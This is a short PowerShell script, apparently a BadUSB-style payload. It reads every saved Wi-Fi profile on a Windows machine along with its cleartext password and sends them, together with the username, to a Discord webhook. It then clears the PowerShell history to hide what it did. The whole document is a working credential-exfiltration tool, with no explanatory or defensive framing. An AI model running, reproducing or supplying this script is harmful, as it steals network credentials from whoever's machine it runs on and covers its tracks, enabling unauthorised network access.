
# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
	$discord='https://discord.com/api/webhooks/1297408069793353748/iQk3KY2n9HivodUu8nENgaQl_PJhnF8LapPJl6GYHyWP4qA2WKA8Z2hNOLITZIEKW6tR'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
	
}

# Clear the PowerShell command history
Clear-History
